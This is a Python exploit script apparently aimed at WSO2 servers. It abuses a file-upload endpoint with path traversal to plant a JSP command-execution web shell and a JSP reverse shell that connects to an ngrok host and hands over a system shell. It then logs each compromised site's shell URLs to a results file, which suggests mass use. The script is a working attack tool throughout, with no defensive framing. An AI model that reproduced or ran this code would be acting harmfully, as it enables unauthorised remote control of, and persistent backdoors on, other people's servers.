import os
import urllib3
import requests
from tool._print import print_shell,not_vuln


shell= """<%@ page import="java.util.*,java.io.*"%>

<html>
<body>
    <FORM METHOD="GET" NAME="myform" ACTION="">
    <INPUT TYPE="text" NAME="cmd">
    <INPUT TYPE="submit" VALUE="Send">
    </FORM>
    <pre>
    <%
        if (request.getParameter("cmd") != null ) {
            out.println("Command: " + request.getParameter("cmd") + "<BR>");
            Runtime rt = Runtime.getRuntime();
            Process p = rt.exec(request.getParameter("cmd"));
            OutputStream os = p.getOutputStream();
            InputStream in = p.getInputStream();
            DataInputStream dis = new DataInputStream(in);
            String disr = dis.readLine();
            while ( disr != null ) {
                out.println(disr);
                disr = dis.readLine();
            }
        }
    %>
    </pre>
</body>
</html>"""

reverse_jsp = '''<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream nJ;
    OutputStream yc;

    StreamConnector( InputStream nJ, OutputStream yc )
    {
      this.nJ = nJ;
      this.yc = yc;
    }

    public void run()
    {
      BufferedReader cA  = null;
      BufferedWriter rKM = null;
      try
      {
        cA  = new BufferedReader( new InputStreamReader( this.nJ ) );
        rKM = new BufferedWriter( new OutputStreamWriter( this.yc ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = cA.read( buffer, 0, buffer.length ) ) > 0 )
        {
          rKM.write( buffer, 0, length );
          rKM.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( cA != null )
          cA.close();
        if( rKM != null )
          rKM.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "0.tcp.ap.ngrok.io", 16906 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
'''
public_key = '''KEY'''

def exploit(url):
    try:
        resp = requests.post(f"https://{url}:443/fileupload/toolsAny", timeout=5, verify=False, files={"../../../../repository/deployment/server/webapps/authenticationendpoint/balgorev.jsp": reverse_jsp})
        resp = requests.post(f"https://{url}:443/fileupload/toolsAny", timeout=5, verify=False, files={"../../../../repository/deployment/server/webapps/authenticationendpoint/balgokey": public_key})
        resp = requests.post(f"https://{url}:443/fileupload/toolsAny", timeout=5, verify=False, files={"../../../../repository/deployment/server/webapps/authenticationendpoint/balgo.jsp": shell})
        if resp.status_code == 200 and len(resp.content) > 0 and 'java' not in resp.text:
            with open("result/shell.txt","a") as wx:
                wx.write(f"https://{url}/authenticationendpoint/balgo.jsp\n{url}/authenticationendpoint/balgorev.jsp\n")
            return print_shell(cms="", poc="WSO2", site=url)
    except:
      return not_vuln(cms="", poc=" WSO2  ", site=url)
      # print(e)